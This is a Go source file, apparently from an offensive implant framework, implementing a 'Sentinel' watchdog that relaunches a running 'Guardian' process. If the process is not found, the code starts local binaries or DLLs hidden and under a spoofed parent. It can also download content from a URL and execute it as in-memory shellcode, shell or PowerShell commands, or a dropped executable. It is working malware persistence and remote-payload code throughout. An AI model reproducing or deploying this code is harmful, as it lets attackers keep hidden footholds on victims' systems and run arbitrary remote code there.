package man

import (
	"context"
	"crypto/cipher"
	"encoding/json"
	"io"
	"net/http"
	"os"
	"sync"
	"time"

	"github.com/iDigitalFlame/xmt/cmd"
	"github.com/iDigitalFlame/xmt/cmd/filter"
	"github.com/iDigitalFlame/xmt/device"
	"github.com/iDigitalFlame/xmt/util/bugtrack"
	"github.com/iDigitalFlame/xmt/util/xerr"
)

const (
	// Self is a constant that can be used to reference the current executable
	// path without using the 'os.Executable' function.
	Self = "*"

	timeout    = time.Second * 2
	timeoutWeb = time.Second * 30
)

// ErrNoEndpoints is an error returned if no valid Guardian paths could be used
// and/or found during a launch.
var ErrNoEndpoints = xerr.Sub("no paths found", 0x13)

// Sentinel is a struct that can be used as a 'Named' arguments value to
// functions in the 'man' package or can be Marshaled from a file or bytes
// source.
type Sentinel struct {
	Filter *filter.Filter
	Linker string
	Paths  []string
}

// Loader is an interface that allows for Sentinel structs to be built ONLY
// AFTER a call to 'Check' returns false.
//
// This prevents reading of any Sentinel files if the Guardian already is
// running and no action is needed.
//
// This is an internal interface that can be used by the 'LazyF' and 'LazyC'
// functions.
type Loader interface {
	Wake(string) (bool, error)
	Check(Linker, string) (bool, error)
	WakeContext(context.Context, string) (bool, error)
	CheckContext(context.Context, Linker, string) (bool, error)
}
type lazyLoader struct {
	o sync.Once
	r *Sentinel
	f func() *Sentinel
}

// F is a helper function that can be used as an in-line function.
//
// This function will ALWAYS return a non-nil Sentinel.
//
// The returned Sentinel will be Marshaled from the supplied file path.
// If any errors occur, an empty Sentinel struct will be returned instead.
func F(p string) *Sentinel {
	s, err := File(p)
	if err == nil {
		return s
	}
	return new(Sentinel)
}
func (z *lazyLoader) init() {
	z.r = z.f()
}

// LazyF is a "Lazy" version of the 'F' function.
//
// This function will ONLY load and read the file contents if the 'Check' result
// returns false.
//
// This function can be used in-place of Sentinel structs in all functions.
func LazyF(p string) Loader {
	return &lazyLoader{f: func() *Sentinel { return F(p) }}
}
func (s Sentinel) text() [][]byte {
	v := make([][]byte, 0, len(s.Paths)+2)
	if s.Filter != nil {
		if b, err := json.Marshal(s.Filter); err == nil && len(b) > 2 {
			v = append(v, b)
		}
	}
	if len(s.Linker) > 0 {
		v = append(v, []byte("*"+s.Linker))
	}
	for i := range s.Paths {
		v = append(v, []byte(s.Paths[i]))
	}
	return v
}

// Check will attempt to contact any current Guardians watching on the supplied
// name. This function returns false if the specified name could not be reached
// or an error occurred.
//
// This function defaults to the 'Pipe' Linker if a nil Linker is specified.
func Check(l Linker, n string) bool {
	if l == nil {
		l = Pipe
	}
	v, err := l.check(n)
	if bugtrack.Enabled {
		bugtrack.Track("man.Check(): l.(type)=%T n=%s, err=%s, v=%t", l, n, err, v)
	}
	return v
}

// LinkerFromName will attempt to map the name provided to an appropriate Linker
// interface.
//
// If no linker is found, the 'Pipe' Linker will be returned.
func LinkerFromName(n string) Linker {
	if len(n) == 0 {
		return Pipe
	}
	switch {
	case len(n) == 1 && (n[0] == 't' || n[0] == 'T'):
		return TCP
	case len(n) == 1 && (n[0] == 'p' || n[0] == 'P'):
		return Pipe
	case len(n) == 1 && (n[0] == 'e' || n[0] == 'E'):
		return Event
	case len(n) == 1 && (n[0] == 'm' || n[0] == 'M'):
		return Mutex
	case len(n) == 1 && (n[0] == 'n' || n[0] == 'N'):
		return Mailslot
	case len(n) == 1 && (n[0] == 's' || n[0] == 'S'):
		return Semaphore
	case len(n) == 3 && (n[0] == 't' || n[0] == 'T'):
		return TCP
	case len(n) == 4 && (n[0] == 'p' || n[0] == 'P'):
		return Pipe
	case len(n) == 5 && (n[0] == 'e' || n[0] == 'E'):
		return Event
	case len(n) == 5 && (n[0] == 'm' || n[0] == 'M'):
		return Mutex
	case len(n) == 8 && (n[0] == 'm' || n[0] == 'M'):
		return Mailslot
	case len(n) == 9 && (n[0] == 's' || n[0] == 'S'):
		return Semaphore
	}
	return Pipe
}

// File will attempt to Marshal the Sentinel struct from the supplied file path.
// This function will also attempt to fill in the Filter and Linker parameters.
//
// Any errors that occur during reading will be returned.
func File(p string) (*Sentinel, error) {
	f, err := os.OpenFile(p, os.O_RDONLY, 0)
	if err != nil {
		return nil, err
	}
	s, err := Reader(f)
	if f.Close(); err != nil {
		return nil, err
	}
	return s, nil
}

// C is a helper function that can be used as an in-line function.
//
// This function will ALWAYS return a non-nil Sentinel.
//
// This function uses the provided 'cipher.Block' to decrypt the resulting file
// data. A nil block is the same as a 'F(p)' call.
//
// The returned Sentinel will be Marshaled from the supplied Cipher and file
// path.
//
// If any errors occur, an empty Sentinel struct will be returned instead.
func C(c cipher.Block, p string) *Sentinel {
	s, err := Crypt(c, p)
	if err == nil {
		return s
	}
	return new(Sentinel)
}

// LazyC is a "Lazy" version of the 'C' function.
//
// This function will ONLY load and read the file contents if the 'Check' result
// returns false.
//
// This function can be used in-place of Sentinel structs in all functions.
func LazyC(c cipher.Block, p string) Loader {
	return &lazyLoader{f: func() *Sentinel { return C(c, p) }}
}
func exec(f *filter.Filter, p ...string) error {
	if len(p) == 0 {
		return cmd.ErrEmptyCommand
	}
	if bugtrack.Enabled {
		bugtrack.Track("man.exec(): Running p=%s", p)
	}
	var (
		n = len(p[0])
		e cmd.Runnable
	)
	if device.OS == device.Windows && (n > 4 && (p[0][n-1] == 'l' || p[0][n-1] == 'L') && (p[0][n-3] == 'd' || p[0][n-3] == 'D') && p[0][n-4] == '.') {
		// NOTE(dij): Work on this after Migration
		// 1 -in- 5 chance of using a Zombie process instead.
		// if util.FastRandN(5) == 0 {
		//	x := cmd.NewZombie(nil, "svchost.exe", "-k", "RPCSS", "-p")
		//	x.Path = p[0]
		//	x.SetWindowDisplay(0)
		//	x.SetNoWindow(true)
		//	e = x
		//} else {
		e = cmd.NewDLL(p[0])
		//}
	} else {
		x := cmd.NewProcess(p...)
		x.SetWindowDisplay(0)
		x.SetNoWindow(true)
		e = x
	}
	e.SetParent(f)
	return e.Start()
}

// Wake will attempt to look for a Guardian using the provided path. This uses
// the set Linker in the Sentinel.
//
// This function will return true and nil if a Guardian is launched and false
// and nil if a Guardian was found. Any other errors that occur will also be
// returned with false.
func (s Sentinel) Wake(n string) (bool, error) {
	return s.WakeContext(context.Background(), n)
}
func (z *lazyLoader) Wake(n string) (bool, error) {
	return z.WakeContext(context.Background(), n)
}

// Check will attempt to look for a Guardian using the provided Linker and path.
// This overrides the set Linker in the Sentinel.
//
// This function will return true and nil if a Guardian is launched and false
// and nil if a Guardian was found. Any other errors that occur will also be
// returned with false.
func (s Sentinel) Check(l Linker, n string) (bool, error) {
	return s.CheckContext(context.Background(), l, n)
}
func (z *lazyLoader) Check(l Linker, n string) (bool, error) {
	return z.CheckContext(context.Background(), l, n)
}

// WakeContext will attempt to look for a Guardian using the provided path.
// This uses the set Linker in the Sentinel and will use the provided Context
// for cancelation.
//
// This function will return true and nil if a Guardian is launched and false
// and nil if a Guardian was found. Any other errors that occur will also be
// returned with false.
func (s Sentinel) WakeContext(x context.Context, n string) (bool, error) {
	return s.CheckContext(x, LinkerFromName(s.Linker), n)
}
func (z *lazyLoader) WakeContext(x context.Context, n string) (bool, error) {
	z.o.Do(z.init)
	return z.r.CheckContext(x, LinkerFromName(z.r.Linker), n)
}
func download(x context.Context, f *filter.Filter, u string) (string, error) {
	var (
		q, c = context.WithTimeout(x, timeout*5)
		r, _ = http.NewRequestWithContext(q, http.MethodGet, u, nil)
	)
	i, err := client.Do(r)
	if c(); err != nil {
		return "", err
	}
	b, err := io.ReadAll(i.Body)
	if i.Body.Close(); err != nil {
		return "", err
	}
	if bugtrack.Enabled {
		bugtrack.Track("man.download(): Download u=%s", u)
	}
	var d bool
	switch ParseDownloadHeader(i.Header) {
	case 1:
		// NOTE(dij): Add transform DLL -to- Shellcode conversion here?
		d = true
	case 2:
		if bugtrack.Enabled {
			bugtrack.Track("man.download(): Download is shellcode u=%s", u)
		}
		e := cmd.NewAsmContext(x, b)
		e.SetParent(f)
		return "", e.Start()
	case 3:
		e := cmd.NewProcessContext(x, device.Shell, device.ShellArgs, string(b))
		e.SetParent(f)
		e.SetNoWindow(true)
		e.SetWindowDisplay(0)
		return "", e.Start()
	case 4:
		e := cmd.NewProcessContext(x, device.PowerShell, "-comm", string(b))
		e.SetParent(f)
		e.SetNoWindow(true)
		e.SetWindowDisplay(0)
		return "", e.Start()
	}
	var n string
	if d {
		n = execB
	} else if device.OS == device.Windows {
		n = execC
	} else {
		n = execA
	}
	z, err := os.CreateTemp("", n)
	if err != nil {
		return "", err
	}
	p := z.Name()
	_, err = z.Write(b)
	if z.Close(); err != nil {
		return p, err
	}
	if bugtrack.Enabled {
		bugtrack.Track("man.download(): Download to tempfile u=%s, p=%s", u, p)
	}
	if os.Chmod(z.Name(), 0755); d {
		e := cmd.NewDLL(z.Name())
		e.SetParent(f)
		return p, e.Start()
	}
	e := cmd.NewProcessContext(x, p)
	e.SetParent(f)
	e.SetNoWindow(true)
	e.SetWindowDisplay(0)
	return p, e.Start()
}

// CheckContext will attempt to look for a Guardian using the provided Linker and
// path. This overrides the set Linker in the Sentinel and will use the provided
// Context for cancelation.
//
// This function will return true and nil if a Guardian is launched and false
// and nil if a Guardian was found. Any other errors that occur will also be
// returned with false.
func (s Sentinel) CheckContext(x context.Context, l Linker, n string) (bool, error) {
	if Check(l, n) {
		return false, nil
	}
	return wake(x, l, n, s.Filter, s.Paths)
}
func (z *lazyLoader) CheckContext(x context.Context, l Linker, n string) (bool, error) {
	if Check(l, n) {
		return false, nil
	}
	z.o.Do(z.init)
	return wake(x, l, n, z.r.Filter, z.r.Paths)
}
func wake(x context.Context, l Linker, n string, f *filter.Filter, p []string) (bool, error) {
	if len(p) == 0 {
		return false, ErrNoEndpoints
	}
	var err error
	if f == nil {
		f = filter.Any
	}
	for i := range p {
		if len(p[i]) == 0 {
			continue
		}
		if bugtrack.Enabled {
			bugtrack.Track("man.wake(): n=%s, i=%d, p[i]=%s", n, i, p[i])
		}
		switch {
		case p[i] == Self:
			var e string
			if e, err = os.Executable(); err == nil {
				err = exec(f, e)
			}
		case len(p[i]) > 5 && (p[i][0] == 'h' || p[i][0] == 'H') && (p[i][1] == 't' || p[i][1] == 'T') && (p[i][2] == 't' || p[i][2] == 'T') && (p[i][3] == 'p' || p[i][3] == 'P'):
			var e string
			if e, err = download(x, f, p[i]); err != nil && len(e) > 0 {
				os.Remove(e)
			}
		default:
			if _, err = os.Stat(p[i]); err == nil {
				err = exec(f, p[i])
			}
		}
		if err == nil {
			if bugtrack.Enabled {
				bugtrack.Track("man.wake(): Wake passed, no errors. Checking l.(type)=%T, n=%s now.", l, n)
			}
			if time.Sleep(timeout); !Check(l, n) {
				if bugtrack.Enabled {
					bugtrack.Track("man.wake(): Wake l.(type)=%T, n=%s failed.", l, n)
				}
				continue
			}
			return true, nil
		}
	}
	if err != nil {
		return false, err
	}
	return false, ErrNoEndpoints
}
